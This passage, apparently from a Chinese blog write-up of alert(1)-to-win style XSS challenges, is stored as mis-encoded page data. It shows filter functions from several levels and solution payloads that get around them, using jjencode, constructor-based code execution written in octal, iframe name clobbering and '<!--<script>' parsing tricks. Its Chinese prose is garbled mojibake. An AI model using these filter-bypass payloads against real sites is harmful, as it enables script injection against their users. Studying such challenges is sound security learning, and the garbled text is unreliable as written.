‡ç­¾ï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæƒ³åˆ°ä¸Šä¸€é¢˜\",[\"$\",\"a\",null,{\"href\":\"#Template\",\"children\":\"Template\"}],\"çš„æ–¹æ³•ï¼Œå³ç”¨åå…­è¿›åˆ¶æˆ–å…«è¿›åˆ¶æ¥è¡¨ç¤ºå°–æ‹¬å·ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°ï¼Œåœ¨è¿™é¢˜å¹¶ä¸ç®¡ç”¨ã€‚æƒ³ä¸æ˜ç™½ä¸ºç”šä¹ˆï¼Œä½†æ˜¯æµ‹è¯•ç»“æœæ˜¯ï¼šå­—ç¬¦ä¸²çš„\",[\"$\",\"code\",null,{\"children\":\"replace\"}],\"æ–¹æ³•æ˜¯è®¤ä¸å‡ºåå…­è¿›æˆ–è€…å…«è¿›åˆ¶ä»£è¡¨çš„å­—ç¬¦çš„ï¼Œä½†æ˜¯\",[\"$\",\"code\",null,{\"children\":\"test\"}],\"æ–¹æ³•å´å¯ä»¥ã€‚æ‰€ä»¥ä¸Šä¸€é¢˜Templateç”¨çš„è¿‡æ»¤æ–¹æ³•replaceè¿‡æ»¤\",[\"$\",\"code\",null,{\"children\":\"\u003c\"}],\"æ‹¬å·æ—¶ï¼Œç”±äºæˆ‘ä»¬ç”¨äº†\",[\"$\",\"code\",null,{\"children\":\"\\\\74\"}],\"æ¥è¡¨ç¤ºï¼Œè€Œreplaceæ–¹æ³•å¹¶ä¸è®¤è¯†å®ƒï¼Œæ‰€ä»¥ç»•è¿‡äº†è¿‡æ»¤ã€‚ä½†æ˜¯è¿™é¢˜ç”¨äº†\",[\"$\",\"code\",null,{\"children\":\"test\"}],\"æ–¹æ³•ï¼Œé¢å¯¹åŒæ ·çš„æƒ…å†µï¼Œå®ƒçŸ¥é“\",[\"$\",\"code\",null,{\"children\":\"\\\\74\"}],\"å³ä»£è¡¨ç€\",[\"$\",\"code\",null,{\"children\":\"\u003c\"}],\"ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ— æ•ˆäº†ã€‚\\næ—¢ç„¶ä¸èƒ½é—­åˆ\",[\"$\",\"code\",null,{\"children\":\"script\"}],\"ï¼Œé‚£å°±å¯ä»¥è€ƒè™‘é—­åˆ\",[\"$\",\"code\",null,{\"children\":\"log\"}],\"ï¼Œåº”è¯¥æ³¨å…¥çš„payloadæ˜¯\",[\"$\",\"code\",null,{\"children\":\"\\\");alert(1)//\"}],\"ï¼Œä½†æ˜¯alertè½¬ä¸ºå¤§å†™å°±ä¸è¡Œäº†ã€‚æ­¤æ—¶æœ€ç®€å•ç²—æš´çš„æ–¹æ³•æ˜¯ç›´æ¥ç”¨\",[\"$\",\"a\",null,{\"href\":\"http://utf-8.jp/public/jjencode.html\",\"children\":\"jjencode\"}],\"( an online non-alphanumeric encoder)ã€‚å°†\",[\"$\",\"code\",null,{\"children\":\"alert(1)\"}],\"ç”¨jjencode encodeå¾—åˆ°çš„è½¬ç åçš„ç»“æœï¼Œç”±äºç»“æœå¤ªé•¿äº†ï¼Œæ‰€ä»¥ç”¨jjencodeä»£è¡¨ï¼Œåˆ™\\nsolutioon(538)ä¸º: \",[\"$\",\"code\",null,{\"children\":\"\\\");jjencode//\"}]]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"ä½†æ˜¯538ä¸ªå­—ç¬¦è¿˜æ˜¯å¤ªé•¿äº†ã€‚åœ¨\",[\"$\",\"a\",null,{\"href\":\"http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/\",\"children\":\"pwntester\"}],\"çš„åšå®¢é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæ›´å¥½çš„åŠæ³•ã€‚\\né¦–å…ˆåº”è¯¥æ³¨å…¥çš„payloadæ˜¯\",[\"$\",\"code\",null,{\"children\":\"\\\"+alert(1))//\\\"\"}],\"\\nä½†æ˜¯è¦æƒ³åŠæ³•ç”¨ç›¸ç­‰æ•ˆæœçš„è¯­å¥æ›¿æ¢æ‰alert(1)ã€‚\\nåœ¨åšå®¢ä¸Šçœ‹åˆ°ä¸€ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥è§¦å‘alert(1)\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[\"[][\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"sort\\\"\"}],\"][\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"constructor\\\"\"}],\"](\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"alert(1)\\\"\"}],\")()\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™ä¸ªå…³é”®åœ¨äº\",[\"$\",\"code\",null,{\"children\":\"Function(\\\"code\\\")\"}],\"ã€‚å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼Œè¿”å›ä¸€ä¸ªä»¥ä¼ è¿›å»çš„å­—ç¬¦ä¸²ä¸ºå‡½æ•°ä½“çš„åŒ¿åå‡½æ•°ã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°å¯ä»¥è®©ä½ å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ¥æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡\",[\"$\",\"code\",null,{\"children\":\"[]['sort']['constructor']\"}],\"æ¥è·å¾—è¿™ä¸ªå‡½æ•°ã€‚\\n\",[\"$\",\"img\",null,{\"src\":\"/images/3.png\",\"alt\":\"\"}],\"\\né¡ºä¾¿ç®€å•è¯´ä¸€ä¸‹ï¼Œ\",[\"$\",\"code\",null,{\"children\":\"[]\"}],\"å®šä¹‰äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼Œæ•°ç»„è‡ªå¸¦äº†å¾ˆå¤šæ–¹æ³•ï¼Œ\",[\"$\",\"code\",null,{\"children\":\"sort\"}],\"æ˜¯å…¶ä¸­ä¸€ä¸ªï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œéšä¾¿ç”¨ä¸€ä¸ªéƒ½è¡Œï¼Œè¿™é‡Œå°±ç”¨äº†sortã€‚\",[\"$\",\"code\",null,{\"children\":\"[][\\\"sort\\\"]\"}],\"çš„æ•ˆæœç›¸å½“äº\",[\"$\",\"code\",null,{\"children\":\"[].sort\"}],\"ã€‚\\næ‰€æœ‰payloadå¯ä»¥æ”¹ä¸º\",[\"$\",\"code\",null,{\"children\":\"\\\"+[][\\\"sort\\\"][\\\"constructor\\\"](\\\"alert(1)\\\")())+\\\"\"}],\"\\næ­¤æ—¶åˆå¤šäº†ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œç”¨ä»€ä¹ˆæ¥ä»£æ›¿ä¸Šé¢çš„ä¸‰ä¸ªå­—ç¬¦ä¸²å‘¢ï¼Ÿ\\nè¿™æ—¶å€™å°±å¯ä»¥ç”¨é¢˜ç›®Templateä¸­ç”¨åˆ°çš„æ–¹æ³•äº†ï¼Œç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿å­—æ¯ã€‚\\næ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ï¼š\\nsolution(99): \",[\"$\",\"code\",null,{\"children\":\"\\\"+[][\\\"\\\\160\\\\157\\\\160\\\"][\\\"\\\\143\\\\157\\\\156\\\\163\\\\164\\\\162\\\\165\\\\143\\\\164\\\\157\\\\162\\\"]('\\\\141\\\\154\\\\145\\\\162\\\\164(1)')()+\\\"\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"iframe\",\"children\":\"iframe\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" tag = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createElement\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'iframe'\"}],\");\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// For this one, you get to run any code you want, but in a \\\"sandboxed\\\" iframe.\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// https://4i.am/?...raw=... just outputs whatever you pass in.\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Alerting from 4i.am won't count.\"}],\"\\n\\n  s = \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003e'\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c\\\\/script\u003e'\"}],\";\\n  tag.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"src\"}],\" = \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'https://4i.am/?:XSS=0\u0026CT=text/html\u0026raw='\"}],\" + \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"encodeURIComponent\"}],\"(s);\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"window\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"WINNING\"}],\" = \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\"}],\") { youWon = \",[\"$\",\"span\",null,{\"className\":\"hljs-literal\",\"children\":\"true\"}],\"; };\\n\\n  tag.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"setAttribute\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'onload'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'youWon \u0026\u0026 alert(1)'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" tag.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"outerHTML\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜å…¶å®ä¹ŸæŒºå¥½ç©çš„ï¼Œå¦‚æœæ¯”è¾ƒç†Ÿæ‚‰iframeçš„ç‰¹æ€§çš„è¯ï¼Œå…¶å®ä¹Ÿå¾ˆç®€å•å¾ˆå¿«å°±åšå‡ºæ¥äº†ï¼Œä½†æ˜¯å¦‚æœä¸çŸ¥é“çš„è¯ï¼Œé‚£å°±æŒºèŠ±æ—¶é—´çš„äº†ã€‚\\nè¿™é¢˜å…³é”®åœ¨äºä½¿å¾—\",[\"$\",\"code\",null,{\"children\":\"youWon\"}],\"è¿™ä¸ªå˜é‡çš„å€¼ä¸ºtrueï¼Œç„¶åå°±å¯ä»¥è§¦å‘alert(1)äº†ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬æ³¨å…¥çš„åœ°æ–¹æ˜¯ä¸€ä¸ªURLï¼Œé¢˜ç›®æœ‰è¯´ï¼Œè¿™ä¸ªurlé¡µé¢è¿”å›çš„é¡µé¢å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯è¯´iframeçš„å†…å®¹æ˜¯ç”±æˆ‘ä»¬å†³å®šçš„ã€‚\\næˆ‘ä»¬çš„è¾“å…¥ä¼šåŒ…è£¹åœ¨ä¸€ä¸ª\",[\"$\",\"code\",null,{\"children\":\"script\"}],\"æ ‡ç­¾é‡Œé¢ã€‚\\nè¦åšå‡ºè¿™é“é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸¤ç‚¹iframeçš„ç‰¹æ€§\"]}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"iframeçš„nameå±æ€§å€¼ï¼ŒåŒæ—¶ä¼šæ³¨å…¥åˆ°çˆ¶é¡µé¢çš„å…¨å±€çª—å£å¯¹è±¡ä¸­ã€‚\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"iframeçš„nameå±æ€§ï¼Œåˆ™iframeçš„window.nameçš„å€¼åŒæ—¶ä¼šè®¾ç½®ä¸ºè¿™ä¸ªnameå±æ€§å€¼ã€‚åè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡æœ‰ä¸ªå‰ææ—¶iframeå¹¶æ²¡æœ‰è®¾ç½®nameå±æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†iframeçš„window.nameï¼ŒåŒæ—¶ä¹Ÿä¼šå°†iframeçš„nameå±æ€§å€¼è®¾ç½®ä¸ºåŒæ ·çš„å€¼ï¼ˆå‰ææ˜¯å®ƒä¸å­˜åœ¨çš„è¯ï¼Œä¸èƒ½è¢«è¦†ç›–ï¼‰\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"æ‰€ä»¥ï¼Œç­”æ¡ˆå‡ºæ¥äº†ã€‚\\nsolution(13)ï¼š \",[\"$\",\"code\",null,{\"children\":\"name='youWon'\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"tism\",\"children\":\"TI(S)M\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"json\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") { \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(s).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\\\\//g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\\\\\\/'\"}],\"); }\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"html\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") { \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[\u003c\u003e\\\"\u0026]/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n                        \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026#'\"}],\" + s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"charCodeAt\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\") + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"';'\"}],\"; }); }\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" (\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003e'\"}],\" +\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'var url = '\"}],\" + \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"json\"}],\"(s) + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'; // We\\\\'ll use this later '\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c/script\u003e\\\\n\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'  \u003c!-- for debugging --\u003e\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'  URL: '\"}],\" + \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"html\"}],\"(s) + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\\n\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c!-- then suddenly --\u003e\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003e\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'  if (!/^http:.*/.test(url)) console.log(\\\"Bad url: \\\" + url);\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'  else new Image().src = url;\\\\n'\"}],\" +\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c/script\u003e'\"}],\"\\n  );\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜æ€è·¯ä¹Ÿæ˜¯ç”±åˆšåˆšé‚£ä¸ªåšä¸»æä¾›çš„ã€‚åŸç†æˆ‘æš‚æ—¶ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨HTML5ä¸­å¦‚æœé‡åˆ°\",[\"$\",\"code\",null,{\"children\":\"\u003c!--\u003cscript\u003e\"}],\"ï¼Œå°±ä¼šè®¤ä¸ºæ¥ä¸‹çš„ä»£ç æ˜¯JSä»£ç ï¼Œç›´åˆ°é‡åˆ°ç»“æŸçš„\",[\"$\",\"code\",null,{\"children\":\"script\"}],\"æ ‡ç­¾ï¼Œä½†æ˜¯å¿…é¡»å¾—ä¿è¯æœ‰ç›¸åº”çš„\",[\"$\",\"code\",null,{\"children\":\"-\u003e\"}],\"ï¼Œå¦åˆ™ä¼šè®¤ä¸ºè¯­æ³•å‡ºé”™çš„ã€‚\\nå…·ä½“çš„å†…å®¹å¯ä»¥åˆ°åˆšåˆšé‚£ä¸ªåšä¸»é‡Œçœ‹å§ï¼Œæˆ‘å°±ç›´æ¥ç»™å‡ºç­”æ¡ˆäº†ã€‚\\nsolution(25): \",[\"$\",\"code\",null,{\"children\":\"if(alert(1)/*\u003c!--\u003cscript\u003e\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"json-â…²\",\"children\":\"JSON â…¢\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"split\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'#'\"}],\").\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"map\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"v\"}],\") {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Only 20% of slashes are end tags; save 1.2% of total\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// bytes by only escaping those.\"}],\"\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" json = \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(v).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\u003c\\\\//g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c\\\\\\\\/'\"}],\");\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log('\"}],\"+json+\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"')\u003c/script\u003e'\"}],\";\\n      }).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"join\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"åˆ©ç”¨ä¸Šä¸€é¢˜çš„åŠæ³•å°±å¯ä»¥åšå‡ºæ¥äº†ã€‚\\nsolution(29): \",[\"$\",\"code\",null,{\"children\":\"\u003c!--\u003cscript\u003e#)/;alert(1)//--\u003e\"}],\"\\nåˆ†æä¸€ä¸‹è¿™ä¸ªç­”æ¡ˆã€‚\\nè¾“å…¥è¿™ä¸ªç­”æ¡ˆï¼Œä¼šè¾“å…¥å¦‚ä¸‹ç»“æœï¼š\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[\"\u003cscript\u003e\",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\u003c!--\u003cscript\u003e\\\"\"}],\")\u003c\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/script\u003e\u003cscript\u003econsole.log(\\\")/\"}],\";\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"alert\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\")\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//--\u003e\\\")\u003c/script\u003e\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å› ä¸ºæˆ‘ä»¬æ³¨å…¥äº†\",[\"$\",\"code\",null,{\"children\":\"\u003c!--\u003cscript\u003e\"}],\"ï¼Œå¯¼è‡´parserå°†è¿™ä¸€æ®µéƒ½å½“ä½œJSæ¥å¤„ç†ã€‚\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\u003c!--\u003cscript\u003e\\\"\"}],\")\u003c\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/script\u003e\u003cscript\u003econsole.log(\\\")/\"}],\";\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"alert\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\")\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//--\u003e\\\")\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"jså¼•æ“ä¼šè§£ææˆå¦‚ä¸‹çš„æ ·å­ï¼š\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"\\nconsole.log(\\\"junk_string\\\") \u003c /junk_regexp/ ; alert(1) // --\u003e\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å…¶ä¸­\\njunk_stringä»£è¡¨ï¼š \",[\"$\",\"code\",null,{\"children\":\"\u003c!--\u003cscript\u003e\"}],\"\\njunk_regexpä»£è¡¨ï¼š \",[\"$\",\"code\",null,{\"children\":\"script\u003e\u003cscript\u003econsole.log(\\\"\\\")\"}],\"\\næˆ‘ä»¬çš„solutionä¸­æ³¨å…¥çš„å…¶ä¸­ä¸¤ä¸ªå­—ç¬¦\",[\"$\",\"code\",null,{\"children\":\")/\"}],\"å°±ä¸ºäº†æ¬ºéª—JSå¼•æ“ï¼ŒJSå¼•æ“ä¼šå°†ä¸¤ä¸ªæ–œæ ä¹‹é—´çš„å†…å®¹å½“ä½œæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ï¼Œç”¨è¿™ä¸ªåŠæ³•æ¥é—­åˆæ‰è¿™äº›å¤šä½™çš„å­—ç¬¦ã€‚\"]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"skandia-â…²\",\"children\":\"Skandia â…¢\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[\\\\\\\\\u003c\u003e]/\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"test\"}],\"(s)) \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'-'\"}],\";\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\" + s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"toUpperCase\"}],\"() + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\")\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜å’Œä¸Šä¸€é¢˜\",[\"$\",\"code\",null,{\"children\":\"Skandia ][\"}],\"å·®ä¸å¤šçš„åšæ³•ã€‚ä¸è¿‡å› ä¸ºè¿‡æ»¤å¤šäº†ä¸€ä¸ªåæ–œæ†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨å…«è¿›åˆ¶æ¥ä»£æ›¿äº†ã€‚é‚£å°±è¦æ¢ä¸€ç§æ€è·¯ã€‚\\nå…ˆæ¥çœ‹çœ‹ä¸‹é¢çš„è¡¨æ ¼ã€‚\\n\",[\"$\",\"img\",null,{\"src\":\"/images/1.png\",\"alt\":\"\"}],\"\\nè¿™é‡Œçš„è¡¨æ 